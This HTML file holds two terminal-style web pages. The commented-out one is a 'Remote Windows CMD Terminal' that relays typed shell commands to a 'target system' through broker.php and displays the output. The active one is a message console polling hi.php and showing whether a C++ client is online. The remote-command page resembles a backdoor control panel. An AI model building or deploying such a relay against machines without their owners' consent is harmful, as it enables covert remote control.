<!--<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Web Command Console</title>
    <style>
        body { background-color: #121212; color: #00FF00; font-family: monospace; padding: 20px; }
        #terminal { width: 100%; height: 400px; background-color: #000; border: 1px solid #333; padding: 10px; overflow-y: scroll; white-space: pre-wrap; box-sizing: border-box; margin-bottom: 10px; }
        #cmdInput { width: 80%; background: #222; border: 1px solid #555; color: #fff; padding: 10px; font-family: monospace; }
        #sendBtn { width: 18%; padding: 10px; background: #00FF00; color: #000; font-weight: bold; cursor: pointer; border: none; }
    </style>
</head>
<body>

    <h2>Remote Windows CMD Terminal</h2>
    <div id="terminal">Waiting for target system...</div>
    
    <input type="text" id="cmdInput" placeholder="Type a command (e.g., ipconfig, dir, whoami) and press Enter..." />
    <button id="sendBtn" onclick="sendCommand()">Execute</button>

    <script>
        // Check for new terminal outputs every 1 second
        setInterval(fetchOutput, 1000);

        function fetchOutput() {
            fetch('broker.php?action=get_output')
                .then(response => response.text())
                .then(data => {
                    if(data.trim() !== "") {
                        const term = document.getElementById('terminal');
                        // DECODE THE URL STRING: Vital to turn %20 and %0A back into spaces and lines
                        term.innerText += decodeURIComponent(data);
                        term.scrollTop = term.scrollHeight; // Auto scroll to bottom
                    }
                });
        }

        function sendCommand() {
            const inputField = document.getElementById('cmdInput');
            const command = inputField.value;
            if(!command) return;

            fetch('broker.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'command=' + encodeURIComponent(command)
            }).then(() => {
                inputField.value = ''; // Clear input field
            });
        }

        // Allow pressing Enter key to send command
        document.getElementById('cmdInput').addEventListener('keypress', function (e) {
            if (e.key === 'Enter') sendCommand();
        });
    </script>
</body>
</html>
--!>
!-->
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Message Console</title>

<style>
body{
background:#121212;
color:#00FF00;
font-family:monospace;
padding:20px;
}

#terminal{
width:100%;
height:400px;
background:#000;
border:1px solid #333;
padding:10px;
overflow-y:scroll;
white-space:pre-wrap;
}

#msg{
width:80%;
background:#222;
color:white;
border:1px solid #555;
padding:10px;
}

button{
width:18%;
padding:10px;
background:#00FF00;
border:0;
font-weight:bold;
}

</style>
</head>

<body>

<h2>Message Console</h2>

<div id="status">Checking...</div>

<div id="terminal">Waiting for messages...</div>

<br>

<input id="msg" placeholder="Type message">

<button onclick="send()">SEND</button>


<script>

let count=0;


function print(t)
{
let box=document.getElementById("terminal");
box.innerHTML+=t+"\n";
box.scrollTop=box.scrollHeight;
}


async function send()
{
let m=document.getElementById("msg").value;

if(!m)return;

await fetch("hi.php?action=send",
{
method:"POST",
body:m
});

document.getElementById("msg").value="";
}


async function receive()
{
let r=await fetch("hi.php?action=get");
let data=await r.json();

while(count<data.length)
{
print(data[count]);
count++;
}

}


async function status()
{
await fetch("hi.php?action=status&name=browser");

let r=await fetch("hi.php?action=check");
let s=await r.json();

let now=Math.floor(Date.now()/1000);

let t="";

t+=s.browser&&now-s.browser<10?
"Browser ONLINE\n":"Browser OFFLINE\n";

t+=s.cpp&&now-s.cpp<10?
"C++ ONLINE":"C++ OFFLINE";

document.getElementById("status").innerText=t;
}


setInterval(receive,2000);
setInterval(status,3000);

</script>

</body>
</html>
